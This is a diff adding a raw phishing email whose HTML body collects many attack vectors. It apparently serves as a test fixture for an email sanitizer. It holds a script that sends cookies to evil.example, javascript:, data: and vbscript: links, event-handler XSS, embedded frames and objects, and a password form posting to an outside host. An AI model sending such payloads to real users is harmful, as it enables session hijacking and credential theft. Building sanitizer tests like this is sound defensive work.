@@ -1,0 +1,35 @@
+From: "IT Support" <support@micros0ft-helpdesk.example>
+To: Sam Taylor <sam@nail.example>
+Subject: Action required: verify your mailbox
+Date: Tue, 29 Sep 2026 02:14:00 +0000
+Message-ID: <verify-now-99@micros0ft-helpdesk.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<meta http-equiv="refresh" content="0; url=https://evil.example/steal">
+<script>fetch('https://evil.example/c?'+document.cookie)</script>
+<base href="https://evil.example/">
+</head>
+<body onload="alert('pwned')">
+<h2>Your mailbox is almost full</h2>
+<p>Please <a href="javascript:alert(document.domain)">verify your account</a>
+or <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click here</a>.</p>
+<p><a href="vbscript:msgbox(1)">Old school</a> and
+<a href="https://evil.example/login" onclick="steal()">the real login page</a>.</p>
+<img src="x" onerror="alert('img')">
+<img src="https://evil.example/pixel.png">
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/flash.swf"></object>
+<embed src="https://evil.example/embed.swf">
+<svg onload="alert(1)"><circle r="10"/></svg>
+<form action="https://evil.example/collect" method="post">
+<input type="password" name="pw" placeholder="Password">
+<button type="submit">Verify</button>
+</form>
+<div style="width: expression(alert(1)); color: red">Styled</div>
+<div style="background:url(javascript:alert(1))">Bad background</div>
+<p style="position: fixed; top: 0; left: 0">Overlay</p>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<p>Regards,<br>IT Support</p>
+</body></html>
